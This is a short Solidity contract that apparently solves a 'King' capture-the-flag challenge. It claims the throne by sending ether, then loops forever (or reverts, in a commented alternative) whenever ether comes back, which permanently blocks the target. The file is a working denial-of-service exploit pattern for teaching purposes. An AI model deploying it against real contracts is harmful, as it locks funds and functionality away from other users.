// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingSolution {
  constructor() payable {}

  function run(address payable _kingAddress) external {
    uint256 weiToSend = 1e15;
    (bool sent,) = _kingAddress.call{value: weiToSend}("");
    require(sent, "Failed to send ether");
  }

  receive() external payable {
    while(true) {}
    // This also works:
    // revert("Hah, you lose!");
  }
}
